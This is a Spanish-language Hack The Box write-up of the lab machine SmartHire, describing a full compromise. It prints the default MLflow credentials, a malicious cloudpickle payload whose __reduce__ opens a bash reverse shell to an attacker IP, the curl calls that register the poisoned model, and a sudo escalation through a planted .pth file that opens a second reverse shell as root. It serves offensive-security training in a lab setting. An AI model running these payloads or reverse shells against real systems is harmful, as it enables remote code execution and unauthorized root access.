# SmartHire – Hack The Box

![SmartHire](smarthire.png)

---

## 📌 Resumen Ejecutivo

| **Propiedad**        | **Valor**                          |
|----------------------|------------------------------------|
| **Máquina**          | SmartHire (Linux)                  |
| **IP**               | 10.129.245.215                     |
| **Servicios**        | SSH (22), HTTP (80)                |
| **Vector inicial**   | Fuzzing de subdominios → `models.smarthire.htb` (MLflow) con credenciales por defecto `admin:password` |
| **Explotación**      | Inyección de artefacto `python_model.pkl` malicioso (cloudpickle) en MLflow, provocando RCE al llamar a `/predict` |
| **Escalada**         | Abuso de `sudo` en script Python que procesa archivos `.pth` en directorio escribible por grupo `devs`, obteniendo shell `root` |
| **Flags**            | `user.txt` (obtenida) · `root.txt` (obtenida) |

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sS -sC -sV -T4 -Pn 10.129.245.215

Resultados relevantes:
Puerto	Servicio	Versión
22/tcp	SSH	OpenSSH 8.9p1 Ubuntu
80/tcp	HTTP	nginx 1.18.0 (Ubuntu)
Descubrimiento de VHosts
bash

ffuf -u http://smarthire.htb \
     -H "Host: FUZZ.smarthire.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 169

Hallazgo: models.smarthire.htb → HTTP/1.1 401 Unauthorized con WWW-Authenticate: Basic realm="mlflow".
bash

echo "10.129.245.215 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts

2. Acceso a MLflow y Preparación del Payload
Credenciales por Defecto
bash

curl -s -u admin:password http://models.smarthire.htb/

✅ Acceso confirmado. El servicio expone la interfaz de MLflow.
Creación del Experimento y Run
bash

# Crear experimento
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/experiments/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "SmartHire"}'
# → experiment_id: "299186230178410763"

# Crear run
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/runs/create" \
  -H "Content-Type: application/json" \
  -d '{"experiment_id": "299186230178410763", "start_time": 1700000000000, "tags": [{"key": "mlflow.runName", "value": "testcompany-run"}]}'
# → run_id: "35c41f3b28964ceab42b804d82d5cfee"

Generación del Artefacto Malicioso (cloudpickle)

gen_payload.py
python

import cloudpickle, os

class Payload:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
        return (os.system, (cmd,))

with open('/tmp/python_model.pkl', 'wb') as f:
    cloudpickle.dump(Payload(), f)

intento

python3 gen_payload.py 

Subida de Artefactos y Registro del Modelo

MLmodel(YAML):
yaml

time_created  :   '2026-07-02 01:00:00.000000' 
 flavors  : 
   python_function  : 
     model_path  :  python_model.pkl 
     loader_module  :  mlflow.sklearn 
     python_version  :  3.10.12 

intento

# Subir MLmodel
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/MLmodel" \
  -H "Content-Type: text/plain" --data-binary @/tmp/MLmodel

# Subir payload
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/python_model.pkl" \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/python_model.pkl

Registro y Promoción a Production
intento

# Registrar modelo
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "testcompany-209c9516c5b6-model"}'

# Crear versión 3 (payload final)
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "testcompany-209c9516c5b6-model", "source": "mlflow-artifacts:/299186230178410763/35c41f3b28964ceab42b804d82d5cfee/artifacts/model", "run_id": "35c41f3b28964ceab42b804d82d5cfee"}'
# → version 3

# Promover a Production
curl -X POST -u admin:password \
  "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/transition-stage" \
  -H "Content-Type: application/json" \
  -d '{"name": "testcompany-209c9516c5b6-model", "version": "3", "stage": "Production"}'

3. Explotación – RCE vía /predict
Obtención de Sesión en SmartHire
intento

# Registro 
 curl   -c  cookies.txt  -X  POST http://smarthire.htb/register  \ 
   -d   "username=test&password=test&company=testcompany" 

 # Inicio de sesión 
 curl   -b  cookies.txt  -c  cookies.txt  -X  POST http://smarthire.htb/login  \ 
   -d   "username=test&password=test" 

CSV Válido para /predict

/tmp/resume.csv
csv

experiencia  ,  habilidades 
 5  ,  Python 
 3  ,  JavaScript 

Disparo del Payload
intento

curl   -b  cookies.txt  -X  POST http://smarthire.htb/predict  -F   "file=@/tmp/resume.csv" 

Respuesta del servidor: 'int' object has no attribute 'predict' (error esperado).

En el listener:
intento

nc   -lvnp   4444 

texto

Conectarse a [10.10.14.11] desde [10.129.245.215] 49158 
 svcweb@smarthire:/var/www/smarthire.htb$ 

✅ Shell obtenida como svcweb.
4. Escalada de Privilegios a Root
Verificación de Permisos
intento

svcweb@smarthire:/$  sudo   -l 
     (  root  )  NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py * 

 svcweb@smarthire:/$  id 
     uid  =  1000  (  svcweb  )   gid  =  1000  (  svcweb  )   groups  =  1000  (  svcweb  )  ,1001  (  mlflowweb  )  ,1002  (  devs  ) 

Análisis del Directorio de Plugins
intento

svcweb@smarthire:/$ ls -la /opt/tools/mlflow_ctl/plugins/
drwxrwxr-x 2 root devs 4096 May 12 15:22 dev

🔴 El directorio dev es escribible por el grupo devs. Python procesa automáticamente archivos .pth mediante site.addsitedir().
Creación del Archivo .pthMalicioso
intento

echo   'import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.11/4445 0>&1\"")'   \ 
   >  /opt/tools/mlflow_ctl/plugins/dev/exploit.pth 

Ejecución con sudo

Oyente (máquina atacante):
intento

nc   -lvnp   4445 

Shell de svcweb:
intento

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

✅ Conexión entrante como root.
5. Banderas
Bandera 	Estado
user.txt	✅ Obtenida (hash oculto por seguridad)
root.txt	✅ Obtenida (hash oculto por seguridad)
6. Lecciones Aprendidas
# 	Lección
1 	Credenciales por defecto en servicios internos (MLflow) son un vector crítico de compromiso inicial.
2 	Deserialización insegura de cloudpickle permite ejecución remota de comandos (RCE) al cargar modelos arbitrarios.
3 	Permisos mal configurados (directorio escribible por grupo en un script con sudo) permiten escalada a root mediante archivos .pth, procesados automáticamente por site.addsitedir().
4	La enumeración meticulosa de vhosts y rutas es esencial para descubrir superficies de ataque ocultas.
7. Herramientas Utilizadas
Herramienta	Uso
Nmap	Escaneo de puertos y servicios
FFUF	Fuzzing de subdominios
cURL	Interacción con APIs REST
cloudpickle	Generación de payloads serializados
Netcat	Recepción de shells inversas
Python	Desarrollo de scripts de explotación
📎 Créditos

    Writeup: Cosmenoide

    Plataforma: Hack The Box

    Máquina: SmartHire

Este documento es una guía didáctica para fines educativos y de aprendizaje en seguridad ofensiva. No debe ser utilizado con fines maliciosos.


